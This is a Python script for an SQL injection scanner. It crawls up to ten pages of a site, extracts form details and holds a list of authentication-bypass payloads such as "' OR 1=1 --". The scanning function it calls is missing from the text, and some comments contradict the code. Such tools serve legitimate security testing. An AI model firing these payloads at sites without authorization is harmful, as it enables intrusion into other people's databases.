import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, quote
from pprint import pprint

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

visited_urls = set()
crawl_count = 0  # Counter for the number of URLs crawled

# Additional payloads for testing SQL injection
payloads = ["' OR 1=1 --", '" OR 1=1 --', "' OR 'a'='a", '" OR "a"="a']

# Clearing the xss.txt file
file = open("sqlresult.txt", "w")
file.write("")
file.close()
print("File cleared!")

def crawl_and_scan(url):
    global crawl_count  # Declare crawl_count as global to modify it inside the function
    if crawl_count >= 10:  # Stop crawling after 60 trials
        return

    if url in visited_urls:
        return

    try:
        res = s.get(url)
        res.raise_for_status()
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")
        return

    visited_urls.add(url)
    crawl_count += 1  # Increment crawl_count after visiting a URL
    print(crawl_count)
    scan_sql_injection(url)

    soup = bs(res.content, "html.parser")
    forms = get_all_forms(url, soup)
    for form in forms:
        form_details = get_form_details(form)
        scan_sql_injection(urljoin(url, form_details["action"]))

    # Recursively crawl all links on the page
    links = [a.get("href") for a in soup.find_all("a", href=True)]
    for link in links:
        absolute_url = urljoin(url, link)
        crawl_and_scan(absolute_url)

def get_all_forms(url, soup):
    """Given a `url` and a BeautifulSoup object, it returns all forms from the HTML content"""
    return soup.find_all("form")

def get_form_details(form):
    """This function extracts all possible useful information about an HTML `form`"""
    details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details
